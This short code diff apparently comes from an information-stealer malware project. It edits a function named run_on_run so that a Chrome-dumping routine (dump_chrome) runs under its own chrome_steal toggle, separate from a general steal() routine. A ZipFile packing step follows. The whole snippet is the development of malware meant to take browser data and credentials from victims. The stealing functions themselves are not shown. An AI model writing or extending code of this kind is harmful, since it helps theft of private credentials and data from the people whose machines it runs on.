@@ -51,9 +51,14 @@ def run_on_run():
     if info_stealer == True:
         try:
             steal()
-            dump_chrome()
         except Exception:
             pass
+        
+    if chrome_steal == True:
+        try:
+            dump_chrome()
+        except Exception as e:
+            print(e)
 
     if pack_include == True:
         with ZipFile(
